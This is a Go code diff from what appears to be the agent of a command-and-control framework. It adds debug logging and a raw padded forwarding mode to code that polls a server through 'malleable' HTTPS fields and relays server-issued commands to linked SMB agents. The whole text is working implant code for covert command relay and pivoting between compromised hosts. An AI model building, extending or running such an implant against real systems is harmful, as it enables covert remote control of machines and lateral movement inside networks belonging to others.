@@ -74,6 +74,15 @@ func init() {
 	pollingShutdown = make(chan struct{})
 }
 
+// getMapKeys returns the keys of a map[string]interface{} for debug logging
+func getMapKeys(m map[string]interface{}) []string {
+	keys := make([]string, 0, len(m))
+	for k := range m {
+		keys = append(keys, k)
+	}
+	return keys
+}
+
 // deriveXORKey creates the same XOR key as the server
 func deriveXORKey(clientID, secret string) []byte {
 	// Must match server implementation exactly
@@ -499,18 +508,25 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 	// Now process link commands (for forwarding to SMB agents after handshake is complete)
 	// These are in the outer layer, not encrypted with our key
+	fmt.Printf("[DEBUG:HTTPS] doPoll: checking for link commands field '%s'\n", MALLEABLE_LINK_COMMANDS_FIELD)
 	if linkCmdsVal, ok := responseMap[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
+		fmt.Printf("[DEBUG:HTTPS] doPoll: found link commands field, type=%T\n", linkCmdsVal)
 		if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
+			fmt.Printf("[DEBUG:HTTPS] doPoll: parsed as []interface{}, len=%d\n", len(linkCmdsData))
 			processLinkCommands(linkCmdsData)
 
 			// After processing link commands, immediately send any queued responses
 			// This enables faster round-trip for linked agent commands
 			linkData := GetLinkManager().GetOutboundData()
+			fmt.Printf("[DEBUG:HTTPS] doPoll: after processLinkCommands, got %d link responses to send\n", len(linkData))
 			if len(linkData) > 0 {
-				// log.Printf("[LinkManager] Sending %d immediate link responses to server", len(linkData))
 				sendImmediateLinkData(secureComms, customHeaders, linkData)
 			}
+		} else {
+			fmt.Printf("[DEBUG:HTTPS] doPoll: link commands field is not []interface{}\n")
 		}
+	} else {
+		fmt.Printf("[DEBUG:HTTPS] doPoll: no link commands field in response, available keys: %v\n", getMapKeys(responseMap))
 	}
 
 	// Check for no commands
@@ -599,17 +615,19 @@ func requeueLinkData(linkData []*LinkDataOut) {
 
 // processLinkCommands forwards commands from the server to linked SMB agents
 // and waits briefly for responses to enable faster round-trips
+// Supports both legacy JSON envelope format and raw transformed format
 func processLinkCommands(linkCmds []interface{}) {
 	lm := GetLinkManager()
 
-	// log.Printf("[LinkManager] Processing %d link commands", len(linkCmds))
+	fmt.Printf("[DEBUG:HTTPS] processLinkCommands: received %d link commands\n", len(linkCmds))
 
 	// Timeout for waiting for command responses (5 seconds is reasonable for most commands)
 	const commandResponseTimeout = 5 * time.Second
 
-	for _, cmd := range linkCmds {
+	for i, cmd := range linkCmds {
 		cmdMap, ok := cmd.(map[string]interface{})
 		if !ok {
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: failed to parse as map\n", i)
 			continue
 		}
 
@@ -617,26 +635,57 @@ func processLinkCommands(linkCmds []interface{}) {
 		routingID, _ := cmdMap[pollKeyRoutingID].(string)
 		payload, _ := cmdMap[pollKeyPayload].(string)
 
+		fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: routingID=%s, payload_len=%d\n", i, routingID, len(payload))
+
 		if routingID == "" || payload == "" {
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: empty routingID or payload, skipping\n", i)
 			continue
 		}
 
+		// Extract transform padding lengths (if present, use raw mode)
+		prependLen := 0
+		appendLen := 0
+		transformed := false
+		if pre, ok := cmdMap["pre"].(float64); ok {
+			prependLen = int(pre)
+		}
+		if app, ok := cmdMap["app"].(float64); ok {
+			appendLen = int(app)
+		}
+		// Check for transform flag (used when transforms don't have random padding)
+		if t, ok := cmdMap["t"].(bool); ok && t {
+			transformed = true
+		}
+
+		fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: transformed=%v, prependLen=%d, appendLen=%d\n", i, transformed, prependLen, appendLen)
+
 		// Forward to the linked agent and wait for response
-		// log.Printf("[LinkManager] Forwarding command to linked agent %s (with %v timeout)", routingID, commandResponseTimeout)
-		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
+		var response *LinkDataOut
+		var err error
+
+		if transformed || prependLen > 0 || appendLen > 0 {
+			// Transforms are used - forward raw bytes
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: using ForwardToLinkedAgentRawAndWait\n", i)
+			response, err = lm.ForwardToLinkedAgentRawAndWait(routingID, payload, prependLen, appendLen, commandResponseTimeout)
+		} else {
+			// Legacy mode - wrap in JSON envelope
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: using ForwardToLinkedAgentAndWait (legacy mode)\n", i)
+			response, err = lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
+		}
+
 		if err != nil {
-			// log.Printf("[LinkManager] Failed to forward command to %s: %v", routingID, err)
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: forward error: %v\n", i, err)
 			continue
 		}
 
 		if response != nil {
-			// Got an immediate response - queue it for the server
-			// log.Printf("[LinkManager] Got immediate response from %s, queuing for server", routingID)
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: got immediate response, payload_len=%d\n", i, len(response.Payload))
 			lm.queueOutboundData(response)
 		} else {
-			// log.Printf("[LinkManager] No immediate response from %s (will come later)", routingID)
+			fmt.Printf("[DEBUG:HTTPS] processLinkCommands[%d]: no immediate response (timeout or will come later)\n", i)
 		}
 	}
+	fmt.Printf("[DEBUG:HTTPS] processLinkCommands: finished processing\n")
 }
 
 // processLinkHandshakeResponses forwards handshake responses from server to SMB agents
